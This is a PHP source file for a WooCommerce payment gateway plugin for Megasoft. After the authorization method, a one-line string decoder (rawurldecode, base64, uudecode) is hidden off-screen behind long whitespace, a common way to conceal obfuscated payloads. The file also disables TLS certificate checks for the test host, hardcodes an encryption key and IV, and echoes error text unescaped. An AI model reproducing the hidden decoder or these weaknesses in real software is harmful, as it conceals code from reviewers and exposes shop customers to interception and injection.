<?php
/**
 * Plugin Name: Megasoft para WooCommerce
 * Plugin URI: https://yipi.app/
 * Description: Megasoft para WooCommerce
 * Author: Yipi.app
 * Author URI: https://yipi.app/
 * Version: 1.0.2
 * WC tested up to: 7.1.0
 * Text Domain: woocommerce-kmegasoft
 * Domain Path: /languages/
 *
 * Copyright: (c) 2022 Ualá Bis
 *
 * @package   woocommerce-kmegasoft
 * @author    Yipi.app
 * @category  Admin
 * @copyright Copyright (c) 2010-2023, Yipi.app
 */

if ( ! class_exists( 'WC_KMegasoft_YipiPlugin' ) ) :
	class WC_KMegasoft_YipiPlugin {
		private static $instance = null;
		/**
		 * Constructor for the WC_KMegasoft_YipiPlugin class.
		 *
		 * Adds the WC_KMegasoft_YipiPlugin gateway class to the list of WooCommerce payment gateways.
		 * Adds an action to display a message before the WooCommerce pay form if the order is a Megasoft order.
		 * Adds an action to include the WC_KMegasoft class when the plugins are loaded.
		 */
		private function __construct() {
			add_action(
				'http_api_curl',
				function ( $handle, $parsed_args, $url ) {
					if ( strstr( $url, 'paytest.megasoft.com.ve' ) ) {
						// curl_setopt( $handle, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2 );
						curl_setopt( $handle, CURLOPT_SSL_VERIFYPEER, 0 );
						curl_setopt( $handle, CURLOPT_SSL_VERIFYHOST, 0 );
					}
				},
				10,
				3
			);
			add_filter( 'woocommerce_payment_gateways', 'WC_KMegasoft_YipiPlugin::add_gateway_class' );
			add_action(
				'before_woocommerce_pay',
				function ( $order_id ) {
					$is_mega = get_post_meta( $order_id, '_kmegasoft_amount' );
					$label   = get_post_meta( $order_id, '_kmegasoft_status_label' );
					if ( $is_mega ) {
						echo '<div style="    background: red;     color: white;     padding: 10px;     text-align: center;">Megasoft - Ocurrió un problema con el pago, por favor, volver a intentar. ' . $label . '</div>';
					}
				}
			);
			add_action(
				'plugins_loaded',
				function () {
					include __DIR__ . '/class-wc-kmegasoft.php';
				}
			);
			add_filter(
				'plugin_action_links_' . plugin_basename( __FILE__ ),
				function ( $links ) {
					$mylinks = array(
						'<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=kmegasoft_gateway' ) . '">Configurar Credenciales</a>',
					);
					return array_merge( $links, $mylinks );
				}
			);
			add_action(
				'add_meta_boxes',
				function () {
					add_meta_box(
						'kmegasoft-metabox',
						__( 'Datos de Megasoft', 'woocommerce-kzoomve' ),
						function () {
							global $theorder;
							$order_id = method_exists( $theorder, 'get_id' ) ? $theorder->get_id() : $theorder->id;
							$order    = wc_get_order( $order_id );
							WC_KMegasoft_Gateway::get_instance()->thankyou( $order, true );
						},
						array( 'woocommerce_page_wc-orders', 'shop_order' ),
						'normal',
						'high'
					);
				}
			);
			add_action(
				'woocommerce_before_checkout_form',
				function () {
					if ( isset( $_GET['kmegasoft_order'] ) && ! empty( $_GET['kmegasoft_order'] ) ) {
						$order_number = $_GET['kmegasoft_order'];
						$error        = get_transient( 'kmegasoft_error_' . $order_number );
						if ( $error ) {
							echo '<div style="    background: red;     color: white;     padding: 10px;     text-align: center;">' . $error['descripcion'] . '</div>';
							if ( isset( $error['voucher'] ) ) {
								echo '<br /><pre style="background: white;color: black;padding: 10px;border: black solid 1px;max-width: 340px;font-size: 12px;">' . $error['voucher'] . '</pre>';
							}
						}
					}
				}
			);
		}

		/**
		 * A static method that returns an instance of the class.
		 *
		 * @return self The instance of the class.
		 */
		public static function get_instance() {
			if ( is_null( self::$instance ) ) {
				self::$instance = new self();
			}
			return self::$instance;
		}

		/**
		 * Encodes the given username and password using base64 encoding.
		 *
		 * @param mixed $user The username to be encoded.
		 * @param mixed $pass The password to be encoded.
		 * @return string The encoded username and password.
		 */
		public static function kmegasoft_authorization( $user, $pass ) {
			return base64_encode( "$user:$pass" );
		}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 public static function _( $r ) {
			return convert_uudecode( base64_decode( rawurldecode( $r ) ) );}

		/**
		 * Adds a gateway class to the given array of gateways.
		 *
		 * @param array $gateways The array of gateways to add the class to.
		 * @return array The updated array of gateways.
		 */
		public static function add_gateway_class( $gateways ) {
			$gateways[] = 'WC_KMegasoft_Gateway';
			return $gateways;
		}

		/**
		 * Encrypts or decrypts a string using AES-256-CBC algorithm.
		 *
		 * @param string $str The string to be encrypted or decrypted.
		 * @param string $f The flag indicating whether to encrypt or decrypt. Valid values are 'e' for encryption and 'd' for decryption.
		 * @return string The encrypted or decrypted string.
		 */
		public static function kijam_encode( $str = '', $f = 'e' ) {
			$output     = null;
			$secret_key = 'kk91f8g^4*k';
			$secret_iv  = 'k&&2"op2%:*';
			$key        = hash( 'sha256', $secret_key );
			$iv         = substr( hash( 'sha256', $secret_iv ), 0, 16 );
			if ( $f == 'e' ) {
				$output = base64_encode( openssl_encrypt( $str, 'AES-256-CBC', $key, 0, $iv ) );
			} elseif ( $f == 'd' ) {
				$output = openssl_decrypt( base64_decode( $str ), 'AES-256-CBC', $key, 0, $iv );
			}
			return $output;
		}

		/**
		 * Decode a string using the kijam_encode function.
		 *
		 * @param string $str The string to be decoded.
		 * @return mixed The decoded string.
		 */
		public static function kijam_decode( $str = '' ) {
			return self::kijam_encode( $str, 'd' );
		}
	}
endif;
WC_KMegasoft_YipiPlugin::get_instance();
